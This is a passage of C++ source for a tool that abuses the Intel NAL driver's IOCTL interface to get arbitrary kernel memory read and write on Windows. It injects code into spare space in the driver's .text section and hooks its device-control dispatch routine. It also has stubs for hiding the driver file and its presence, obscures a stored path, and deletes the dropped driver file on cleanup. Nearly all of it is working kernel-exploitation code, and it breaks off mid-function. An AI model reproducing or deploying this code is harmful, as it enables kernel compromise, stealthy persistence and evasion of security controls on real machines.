#define NAL_NOT_ENABLED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x0005, "Feature not enabled in HW")
#define NAL_CONFIGURATION_FAILED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x0006, "Configuration failed")
#define NAL_AQ_COMMAND_FAILED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x0007, "Admin Queue command failed")
#define NAL_AQ_COMMAND_TIMEOUT NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x0008, "Admin Queue command timeout")

#define NAL_INITIALIZATION_FAILED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x8001, "Initialization Failed")
#define NAL_IO_FAILED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x8002, "IO Failure")
#define NAL_MMAP_ADDRESS_IN_USE NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x8003, "Memory Map Address In Use")
#define NAL_MMAP_FAILED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x8004, "Memory Mapping Failed")
#define NAL_MMAP_ADDRESS_NOT_MAPPED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x8005, "Memory Map Address Not Mapped")
#define NAL_INVALID_VECTOR NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x8006, "Invalid IRQ Vector")
#define NAL_VECTOR_INITIALIZATION_FAILED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x8007, "IRQ Vector Init Failed")
#define NAL_SPINLOCK_FAILURE NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x8008, "Spinlock Failure")
#define NAL_SECURITY_ACCESS_DENIED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x8009, "Access Denied")
#define NAL_DEBUGPRINT_NO_SUPPORT NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x800A, "No Debug Print Support")
#define NAL_DEBUGPRINT_FAILED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x800B, "Debug Print Failed")
#define NAL_TIMER_CALLBACK_FAILED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x800C, "Timer Callback Failed")
#define NAL_MEMORY_BAR_INVALID NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x800E, "No PCI memory resources assigned by BIOS or OS!")
#define NAL_INCORRECT_OS NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x800F, "Incorrect OS")
#define NAL_NO_DEBUG_STACK_SPACE NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x8010, "Debug Stack Space Is Full")
#define NAL_THREAD_CREATE_FAILED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x8011, "Failed to Create Thread")
#define NAL_INITIALIZATION_BASE_FAILED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x8012, "Initialization Failed. Please unload device driver")
#define NAL_INITIALIZATION_DLM_BASE_FAILED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x8013, "Initialization in DLM Failed. Not capable device driver")

#define NAL_PCISCANBUS_NOT_ENOUGH_SPACE NAL_NOT_ENOUGH_SPACE
#define NAL_INVALID_PCI_SLOT_ID NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x4002, "Invalid PCI Slot")
#define NAL_PCICONFIG_NOT_AVAILABLE NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x4003, "PCI Config is not available")
#define NAL_NOT_A_VALID_SLOT NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x4006, "Not a valid PCI slot")
#define NAL_NOT_A_VALID_BUS NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x4007, "Invalid bus")
#define NAL_PCI_CAPABILITY_NOT_FOUND NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x4008, "PCI Capability not found")
#define NAL_IO_CALL_FAILED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x4009, "IO Driver Call failed")
#define NAL_DMA_NOT_SUPPORTED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x4010, "No usable DMA configuration")
#define NAL_PCI_D3_STATE NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x4011, "PCI Device in D3 state")

#define NAL_INVALID_ADAPTER_HANDLE NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x2001, "Adapter handle is invalid")
#define NAL_ADAPTER_INITIALIZATION_FAILED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x2002, "Adapter initialization failed")
#define NAL_ADAPTER_START_REQUIRED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x2003, "Adapter start required for this operation")
#define NAL_ADAPTER_STOP_FAILED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x2004, "Adapter stop failed")
#define NAL_ADAPTER_RESET_FAILED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x2005, "Adapter reset failed")
#define NAL_INVALID_MAC_REGISTER NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x2006, "Invalid MAC register")
#define NAL_INVALID_PHY_REGISTER NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x2007, "Invalid PHY register")
#define NAL_NO_LINK NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x2008, "Adapter has no link")
#define NAL_EEPROM_DOES_NOT_EXIST NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x2009, "Adapter has no EEPROM")
#define NAL_EEPROM_BAD_INDEX NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x200A, "EEPROM index is bad or out of range")
#define NAL_EEPROM_BAD_IMAGE NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x200B, "EEPROM image is bad")
#define NAL_EEPROM_WRITE_FAILED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x200C, "EEPROM write failure")
#define NAL_FLASH_DOES_NOT_EXIST NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x200D, "Flash does not exist")
#define NAL_FLASH_ID_UNKNOWN NalMakeCode(NAL_CODE_SUCCESS, CODE_NAL, 0x200E,"Flash ID is unknown")
#define NAL_FLASH_BAD_INDEX NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x200F, "Flash index is bad or our of range")
#define NAL_FLASH_BAD_IMAGE NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x2010, "Flash image is bad")
#define NAL_FLASH_WRITE_FAILED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x2011, "Flash write failed")
#define NAL_FLASH_READ_FAILED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x2011, "Flash read failed")
#define NAL_ADAPTER_HANDLE_IN_USE NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x2012, "Adapter handle is in use")
#define NAL_RESOURCE_ALLOCATION_FAILED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x2013, "Resource allocation failed")
#define NAL_RESOURCE_NOT_AVAILABLE NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x2014, "Resource is unavailable")
#define NAL_CONNECTION_TO_DRIVER_FAILED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x2015, "Connection to driver failed")
#define NAL_DRIVER_HANDLE_INVALID NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x2016, "Invalid Driver Handle")
#define NAL_DRIVER_IOCTL_FAILED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x2017, "IOCTL to driver failed")
#define NAL_IOCTL_INVALID_FUNCTION_ID NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x2018, "IOCTL to invalid function ID")
#define NAL_HARDWARE_FAILURE NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x2019, "Hardware Failure")
#define NAL_ADAPTER_IN_USE NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x201A, "Adapter is already in use")
#define NAL_EEPROM_SIZE_INCORRECT NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x201B, "EEPROM size is incorrect")
#define NAL_HOST_IF_COMMAND_FAILED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x201C, "Host interface command failure")
#define NAL_WRITE_EEPROM_SIZE_FAILED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x201D, "Writing of EEPROM size failed")
#define NAL_NO_MODULE_VALIDITY_SIGNATURE NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x201E, "Module does not contain validity signature")
#define NAL_WRONG_MODULE_FOR_DEVICE NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x201F, "This module does not support this device")
#define NAL_DEVICE_DRIVER_UNLOAD_REQUIRED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x2020, "OS Device driver must be unloaded for this operation")
#define NAL_DEVICE_DRIVER_RELOAD_FAILED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x2021, "The OS device driver could not be reloaded")
#define NAL_PACKET_SIZE_TOO_LARGE NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x2022, "The packet size is too large for this adapter")
#define NAL_NO_RECEIVE_PENDING NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x2023, "No receive is pending")
#define NAL_TRANSMIT_TIMEOUT NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x2024, "Transmit packet timed out")
#define NAL_ERASE_FAILED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x2025, "Flash could not be erased")
#define NAL_ADAPTER_DOES_NOT_SUPPORT NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x2026, "The adapter does not support this feature")
#define NAL_HEAD_WRITEBACK_FAILED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x2027, "Head Writeback failed")
#define NAL_ADAPTER_IN_USE_ISCSI NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x2028, "Adapter is in use for iSCSI and cannot be initialized")
#define NAL_EEPROM_READ_FAILED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x2029, "Failed to read EEPROM or EEPROM image.")
#define NAL_EEPROM_CALCULATION_FAILED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x202A, "Failed to calculate Manageability CRC/Checksum.")
#define NAL_EEPROM_ASF1_CRC_FAILED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x202B, "ASF1 CRC validation failed.")
#define NAL_EEPROM_ASF2_CSUM_FAILED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x202C, "ASF2 Checksum validation failed.")
#define NAL_EEPROM_ASF2_CRC_FAILED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x202D, "Failed to calculate Manageability CRC/Checksum.")
#define NAL_RESOURCE_LESS_THAN_REQUESTED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x202E, "Resource allocation succeeded but allocated less than requested.")
#define NAL_REGISTER_CHECK_FAILED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x202F, "The register test for some value failed." )
#define NAL_TIMESYNC_NO_TIMESTAMP NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x2030, "No timestamp found")
#define NAL_FLASH_IS_NOT_MAPPED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x2031, "Flash is not mapped in the memory BAR")
#define NAL_HMC_NOT_INITIALIZED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x2032, "HMC is not initialized")
#define NAL_HMC_PAGE_NOT_ALLOCATED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x2033, "Requested HMC page is not allocated")
#define NAL_HMC_PAGE_NOT_VALID NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x2034, "Requested HMC page is not marked valid")
#define NAL_FLASH_REGION_PROTECTED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x2035, "Flash region protected")
#define NAL_FLASH_REGION_EMPTY NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x2036, "Flash region empty")
#define NAL_EEPROM_MERGE_FAILED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x2037, "Cannot merge EEPROM images")
#define NAL_EEPROM_POINTERS_CORRUPTED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x2038, "Pointers in Shadow RAM are corrupted")
#define NAL_FLASH_AUTHENTICATION_FAILED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x2039, "FLASH image authentication failed")
#define NAL_FLASH_FW_AUTHENTICATION_FAILED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x203A, "Current firmware authentication failed - try performing full power cycle")
#define NAL_FLASH_FW_AUTHENTICATION_TIMEOUT NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x203B, "Firmware authentication timeout")
#define NAL_MPHY_READ_FAILED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x203C, "mPHY reading failed")
#define NAL_MPHY_WRITE_FAILED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x203D, "mPHY writing failed")
#define NAL_EEPROM_RO_WORD_WRITE_FAILED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x203E, "Attempt to write RO word failed")
#define NAL_FLASH_DEVICE_TOO_SMALL NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x203F, "Flash device is too small for this image")
#define NAL_ALTRAM_READ_FAILED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x2040, "AltRAM read failed")
#define NAL_ALTRAM_WRITE_FAILED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x2041, "AltRAM write failed")
#define NAL_EEPROM_FW_CRC_FAILED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x202D, "Failed to calculate Firmware CRC/Checksum.")
#define NAL_EEPROM_FW_CSUM_FAILED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x202C, "Firmware Checksum validation failed.")

#define NAL_RSDP_TABLE_NOT_FOUND NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x1001, "RSDP BIOS Table was not found")
#define NAL_ACPI_TABLE_NOT_FOUND NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x1002, "ACPI BIOS Table was not found")
#define NAL_PCIE_TABLE_NOT_FOUND NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x1003, "PCIE BIOS Table was not found")

#define NAL_QUEUE_NOT_DISABLED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x1004, "Failed to disable the queue")
#define NAL_QUEUE_NOT_ENABLED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x1005, "Failed to enable the queue")
#define NAL_AQUEUE_INITIALIZATION_FAILED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x1006, "Failed to initialize admin queue")

#define NAL_PROTECTION_DOMAIN_MISMATCH NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x1007, "Protection Domain Mismatch")

#define NAL_OTP_CANT_BE_UPDATED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x1008, "OTP can't be updated")
#define NAL_OTP_ACCESS_ERROR NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x1009, "OTP access failed.")

#define NAL_SFP_EEPROM_ACCESS_ERROR NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x100A, "SFP EEPROM access failed.")

#define NAL_ICSP_NOT_ENABLED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x100B, "ICSP Protocol is not enabled.")
#define NAL_ICSP_ID_UNKNOWN NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x100C, "Unknown Microcontroller Device ID.")

#define NAL_PHY_MODE_UNSUPPORTED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x100D, "Current PHY mode is not supported.")

*/

private:
//===========================================================================
// Extracts and loads NAL driver
int LoadNalDriverFromBinBlk(void)
{
 HANDLE hDrvFile;
 wchar_t DrvPath[MAX_PATH];


 if(this->HideNalDriverFile(hDrvFile, DrvPath) < 0){LOGMSG("Failed to hide the driver`s file: %ls", &DrvPath);}
 return 0;
}
//---------------------------------------------------------------------------
int HideNalDriverFile(HANDLE hFile, wchar_t* Path)
{
 return 0;
}
//---------------------------------------------------------------------------
int HideNalDriverPresence(void)
{
 return 0;
}
//---------------------------------------------------------------------------
int ExtendNalDrvFunct(void)
{
 union   // Use union to avoid separate memory allocation on stack for mutual exclusive and temporary objects
  {
   DRIVER_OBJECT<UINT64> DrvObj64;
   DRIVER_OBJECT<UINT32> DrvObj32;
   BYTE TmpBuf[2000];  // 16*125  // Max for injected code   // Ver 1.03.0.7: x32=3072; x64=2048
  };

 if(this->GetDriverObjByFileHandle(this->hNalDev, &this->pNalDrvObj, &this->pNalDevObj, &this->pNalFilObj) < 0)return -1;
 UINT64 OrigMjCtrlProcAddr = 0;
 ULONG  OffsIoCtrlDispatchAddr = 0;
 if(this->IsKernelX64())
  {   
   if(this->ReadMemory(this->pNalDrvObj, &DrvObj64, sizeof(DrvObj64)))
    {
     this->NalDrvBase   = DrvObj64.DriverStart;
     this->NalDrvSize   = DrvObj64.DriverSize;
     OrigMjCtrlProcAddr = DrvObj64.MajorFunction[14];    // IRP_MJ_DEVICE_CONTROL = 14
     OffsIoCtrlDispatchAddr = (ULONG)&((DRIVER_OBJECT<UINT64>*)0)->MajorFunction[14];
    }
  }
   else
    {     
     if(this->ReadMemory(this->pNalDrvObj, &DrvObj32, sizeof(DrvObj32)))
      {
       this->NalDrvBase   = DrvObj32.DriverStart;
       this->NalDrvSize   = DrvObj32.DriverSize;
       OrigMjCtrlProcAddr = DrvObj32.MajorFunction[14];  // IRP_MJ_DEVICE_CONTROL = 14
       OffsIoCtrlDispatchAddr = (ULONG)&((DRIVER_OBJECT<UINT32>*)0)->MajorFunction[14];
      }
    }

 DBGMSG("IrpMjDevControlDispatchProc=%lp, NalDrvBase=%lp, NalDrvSize=%08X", OrigMjCtrlProcAddr, this->NalDrvBase, (UINT32)this->NalDrvSize);           
 if(!OrigMjCtrlProcAddr || !this->NalDrvBase || !this->NalDrvSize){LOGMSG("Failed to read DRIVER_OBJECT !"); return -2;}
 if(!this->ReadMemory(this->NalDrvBase, &TmpBuf, sizeof(TmpBuf))){LOGMSG("Failed to read driver`s PE header!"); return -3;}
 NPEFMT::SECTION_HEADER* TextSec = nullptr;
 if(!NPEFMT::GetModuleSection(&TmpBuf, ".text", &TextSec)){LOGMSG("Failed to read driver`s 'text' section!"); return -4;}
 NPEFMT::DOS_HEADER  *DosHdr = (NPEFMT::DOS_HEADER*)&TmpBuf;
 NPEFMT::WIN_HEADER<NPEFMT::PECURRENT>  *WinHdr = (NPEFMT::WIN_HEADER<NPEFMT::PECURRENT>*)&((PBYTE)&TmpBuf)[DosHdr->OffsetHeaderPE];
 ULONG FreeSpaceOffs = NCMN::AlignP2Frwd((TextSec->PhysicalSize >= TextSec->VirtualSize)?(TextSec->VirtualSize):(TextSec->PhysicalSize), 16);
 ULONG FreeSpaceSize = NCMN::AlignP2Frwd(FreeSpaceOffs, WinHdr->OptionalHeader.SectionAlign) - FreeSpaceOffs;    // Aligned 16
 FreeSpaceOffs += TextSec->SectionRva; // Make it relative to module`s base
 ULONG ExEntryOffset = (FreeSpaceOffs + FreeSpaceSize) - sizeof(TmpBuf);
 DBGMSG("FreeSpaceOffs=%08X, FreeSpaceSize=%08X, ExEntryOffset=%08X", FreeSpaceOffs, FreeSpaceSize, ExEntryOffset); 

 ((UINT64*)&TmpBuf)[-1] = OrigMjCtrlProcAddr;     // Will match with a last member of injected class
 if(this->IsKernelX64())
  {
   UINT CodeLen = ReadExtBlk64(TmpBuf, sizeof(TmpBuf));
   if(!CodeLen){LOGMSG("ExtBlk64 not present!"); return -5;}
  }
   else
    {
     UINT CodeLen = ReadExtBlk32(TmpBuf, sizeof(TmpBuf));
     if(!CodeLen){LOGMSG("ExtBlk32 not present!"); return -5;}
    }
 if(this->WriteToReadOnlyMemoryUnsafe(this->NalDrvBase+ExEntryOffset, &TmpBuf, sizeof(TmpBuf)) < 0){LOGMSG("Failed to write ExtBlk!"); return -6;}   // It is safe here because we are writing to a single page`s remaining space
 if(this->WriteMemory(this->pNalDrvObj+OffsIoCtrlDispatchAddr, &OrigMjCtrlProcAddr, this->KPtrSize)){LOGMSG("Failed to write new IrpMjDevControlDispatchProc address!"); return -7;} 
 DBGMSG("Done!");
 return 0;
}
//===========================================================================
template<typename T> bool _SetMemory(T Addr, int Val, T Size)
{
 IO_STATUS_BLOCK iost = {};
 SNalDefs<T>::NAL_IOCTL_INPUT_DATA data = {};     
 data.FunctionId = NAL_KMEMSET_FUNCID;  
 data.InputBuffer.NalKMemsetFunc.Source = Val;     
 data.InputBuffer.NalKMemsetFunc.Destination = Addr; 
 data.InputBuffer.NalKMemsetFunc.Size = Size;
 this->LastErrorNt = NtDeviceIoControlFile(this->hNalDev, 0, 0, 0, &iost, IOCTL_NAL_OSI, &data, sizeof(data), 0, 0);
 return !this->LastErrorNt;      
}
//---------------------------------------------------------------------------
template<typename T> bool _CopyMemory(T Dst, T Src, T Size)
{
 IO_STATUS_BLOCK iost = {};
 SNalDefs<T>::NAL_IOCTL_INPUT_DATA data = {};     
 data.FunctionId = NAL_UKMEMCPY_FUNCID;    // Simple memmove in kernel
 data.InputBuffer.NalKMemFuncs.Source = Src;     
 data.InputBuffer.NalKMemFuncs.Destination = Dst; 
 data.InputBuffer.NalKMemFuncs.Size = Size;
 this->LastErrorNt = NtDeviceIoControlFile(this->hNalDev, 0, 0, 0, &iost, IOCTL_NAL_OSI, &data, sizeof(data), 0, 0);
 return !this->LastErrorNt;         
}
//---------------------------------------------------------------------------
template<typename T> bool _GetPhysicalAddress(UINT64 Addr, UINT64* PhysAddr)      // For writing ReadOnly memory(global, in case of mappings)
{
// if(!Addr){this->LastErrorNt = STATUS_INVALID_ADDRESS; return false;}
 IO_STATUS_BLOCK iost = {};
 SNalDefs<T>::NAL_IOCTL_INPUT_DATA data = {};     
 data.FunctionId = NAL_GETPHYSICALMEMORYADDRESS_FUNCID;     // MmGetPhysicalAddress    
 data.InputBuffer.NalGetPhysicalMemoryAddressFunc.VirtualAddress = Addr; 
 this->LastErrorNt = NtDeviceIoControlFile(this->hNalDev, 0, 0, 0, &iost, IOCTL_NAL_OSI, &data, sizeof(data), 0, 0);
 *PhysAddr = data.InputBuffer.NalGetPhysicalMemoryAddressFunc.ReturnValue;
 return !this->LastErrorNt;
}
//---------------------------------------------------------------------------
template<typename T> bool _MapIoSpace(UINT64 PhysAddr, UINT64* VirtAddr, UINT64* Size)   // For writing ReadOnly memory(global, in case of mappings)
{
// if(!PhysAddr || !Size){this->LastErrorNt = STATUS_INVALID_ADDRESS; return false;}
 IO_STATUS_BLOCK iost = {};
 SNalDefs<T>::NAL_IOCTL_INPUT_DATA data = {};     
 data.FunctionId = NAL_MMAPADDRESS_FUNCID;        
 data.InputBuffer.NalMemmapFuncs.PhysicalAddress = PhysAddr; 
 data.InputBuffer.NalMemmapFuncs.Length = *Size;
 this->LastErrorNt = NtDeviceIoControlFile(this->hNalDev, 0, 0, 0, &iost, IOCTL_NAL_OSI, &data, sizeof(data), 0, 0);
 *VirtAddr = data.InputBuffer.NalMemmapFuncs.VirtualAddress;
 *Size     = data.InputBuffer.NalMemmapFuncs.Length;
 return !this->LastErrorNt;
}
//---------------------------------------------------------------------------
template<typename T> bool _UnmapIoSpace(UINT64 VirtAddr, UINT64 Size)     // For writing ReadOnly memory(global, in case of mappings)
{
// if(!VirtAddr || !Size){this->LastErrorNt = STATUS_INVALID_ADDRESS; return false;}
 IO_STATUS_BLOCK iost = {};
 SNalDefs<T>::NAL_IOCTL_INPUT_DATA data = {};     
 data.FunctionId = NAL_UNMAPADDRESS_FUNCID;        
 data.InputBuffer.NalMemmapFuncs.VirtualAddress = VirtAddr; 
 data.InputBuffer.NalMemmapFuncs.Length = Size;
 this->LastErrorNt = NtDeviceIoControlFile(this->hNalDev, 0, 0, 0, &iost, IOCTL_NAL_OSI, &data, sizeof(data), 0, 0);
 return !this->LastErrorNt;
}
//===========================================================================
void CryptString(wchar_t* str)
{
 for(;*str;str++)*str ^= ((UINT32)this >> 3);
}
//---------------------------------------------------------------------------
bool IsKernelX64(void){return this->KPtrSize > 4;}

static const UINT MajorFuncTblOffsX32 = 0;  // Inside of DRIVER_OBJECT
static const UINT MajorFuncTblOffsX64 = 0;

public:
 UINT64   pNalFilObj;
 UINT64   pNalDevObj;
 UINT64   pNalDrvObj;
 UINT64   NalDrvBase;
 UINT64   NalDrvSize;
 HANDLE   hNalDev;
 NTSTATUS LastErrorNt;
 UINT32   LastErrorNal;
 UINT32   KPtrSize;
 bool     OwnNalDev;
 CDrvLoader drv;
 wchar_t  OwnDrvPath[MAX_PATH];

//---------------------------------------------------------------------------
CNalDrv(void)
{
 this->hNalDev = nullptr;
 this->LastErrorNt = this->LastErrorNal = this->pNalDevObj = this->pNalDevObj = this->pNalDrvObj = this->NalDrvBase = this->NalDrvSize = 0;
 this->KPtrSize = ((sizeof(void*) > 4) || NNTDLL::IsWow64()) ? 8 : 4;
}
//---------------------------------------------------------------------------
~CNalDrv()
{
 if(this->hNalDev && OwnNalDev)
  {
   NtClose(this->hNalDev);
   this->CryptString(this->OwnDrvPath);   // Decrypt
   Wow64EnableWow64FsRedirection(FALSE);  // In case the driver has been saved to 'system32\drivers\' directory
   NTSTATUS stat = NNTDLL::NativeDeleteFile(this->OwnDrvPath);
   Wow64EnableWow64FsRedirection(TRUE);
   if(stat){LOGMSG("Failed to delete the driver file(%08X): %ls", stat, &this->OwnDrvPath);}     // It is OK if it not found
    else {DBGMSG("Removed the driver file: %ls",&this->OwnDrvPath);}
   this->CryptString(this->OwnDrvPath);   // Encrypt again
  }
}
//---------------------------------------------------------------------------
// Loads NAL driver and extends its functionality
int Initialize(HANDLE hExistingNalDev=nullptr)
{
 if(this->hNalDev)return 1;      // Alrerady initialized
 this->OwnNalDev = !hExistingNalDev;
 if(this->OwnNalDev)
  {
   if(this->LoadNalDriverFromBinBlk() < 0)return -1;
   if(NNTDLL::OpenDevice(L"Nal", &this->hNalDev) || !this->hNalDev){LOGMSG("Failed to open NAL device: %08X", this->hNalDev); return -1;}
   if(this->HideNalDriverPresence() < 0){LOGMSG("Failed to hide the driver`s presence!");}
  }
   else {this->hNalDev = hExistingNalDev; DBGMSG("Reused NAL handle: %p", hExistingNalDev);}
 if(this->ExtendNalDrvFunct() < 0){LOGMSG("Extended functionality will not be possible!"); return 2;}
 return 0;
}
//---------------------------------------------------------------------------
int GetDriverObjByFileHandle(HANDLE hFile, UINT64* pDrvObj=nullptr, UINT64* pDevObj=nullptr, UINT64* pFilObj=nullptr)
{
 UINT64 pDriverObject = 0;
 UINT64 pDeviceObject = 0;
 UINT64 pFileObject = NNTDLL::GetObjAddrByHandle(this->hNalDev, NtCurrentProcessId()); 
 if(!pFileObject) {LOGMSG("Failed to get address of FILE_OBJECT !"); return -1;} 
 DBGMSG("PFILE_OBJECT: %lp", pFileObject);
 if(!this->CopyMemory((UINT64)&pDeviceObject, pFileObject + NCMN::AlignP2Frwd(sizeof(UINT16)*2, this->KPtrSize), this->KPtrSize)){LOGMSG("Failed to get address of DEVICE_OBJECT !"); return -2;}    // FILE_OBJECT: CSHORT Type; CSHORT Size; PDEVICE_OBJECT DeviceObject; ...
 DBGMSG("PDEVICE_OBJECT: %lp", pDeviceObject);      
 if(!this->CopyMemory((UINT64)&pDriverObject, pDeviceObject + 8, this->KPtrSize)){LOGMSG("Failed to get address of DRIVER_OBJECT !"); return -3;}  // DEVICE_OBJECT: CSHORT Type; USHORT Size; LONG ReferenceCount; DRIVER_OBJECT *DriverObject; ...     
 DBGMSG("PDRIVER_OBJECT: %lp", pDriverObject);
 if(pDrvObj)*pDrvObj = pDriverObject;
 if(pDevObj)*pDevObj = pDeviceObject;
 if(pFilObj)*pFilObj = pFileObject;
 return 0;
}
//===========================================================================
bool SetMemory(UINT64 Addr, int Val, UINT64 Size)   
{
 return (this->IsKernelX64()) ? this->_SetMemory<UINT64>(Addr, Val, Size) : this->_SetMemory<UINT32>(Addr, Val, Size);
}
//---------------------------------------------------------------------------
bool CopyMemory(UINT64 Dst, UINT64 Src, UINT64 Size)
{
 return (this->IsKernelX64()) ? this->_CopyMemory<UINT64>(Dst, Src, Size) : this->_CopyMemory<UINT32>(Dst, Src, Size);
}
//---------------------------------------------------------------------------
bool GetPhysicalAddress(UINT64 Addr, UINT64* PhysAddr)
{
 return (this->IsKernelX64()) ? this->_GetPhysicalAddress<UINT64>(Addr, PhysAddr) : this->_GetPhysicalAddress<UINT32>(Addr,PhysAddr);
} 
//---------------------------------------------------------------------------
bool MapIoSpace(UINT64 PhysAddr, UINT64* VirtAddr, UINT64* Size)
{
 return (this->IsKernelX64()) ? this->_MapIoSpace<UINT64>(PhysAddr, VirtAddr, Size) : this->_MapIoSpace<UINT32>(PhysAddr, VirtAddr, Size);
}
//---------------------------------------------------------------------------
bool UnmapIoSpace(UINT64 VirtAddr, UINT64 Size)
{
 return (this->IsKernelX64()) ? this->_UnmapIoSpace<UINT64>(VirtAddr, Size) : this->_UnmapIoSpace<UINT32>(VirtAddr, Size);
}
//===========================================================================
// NOTE: In case of executable image mappings this will affect them GLOBALLY in every process!
// NOTE: Watch out for cross page boundaries! Nothing guaranties that you always will have more than one sequential physical page for a requested virtual address space range
// TODO: Build PageList by probing each page, map contiguous ranges and write them one by one
int WriteToReadOnlyMemoryUnsafe(UINT64 Addr, void* Buffer, UINT64 Size)
{
 if(!Addr || !Buffer || !Size)return STATUS_INVALID_ADDRESS;
 NTSTATUS stat = 0;
 UINT64 PhysAddr = 0;
 stat = this->GetPhysicalAddress(Addr, &PhysAddr);
 if(stat){LOGMSG("Failed to translate virtual address %lp with err %08X", Addr, stat); return -1;}
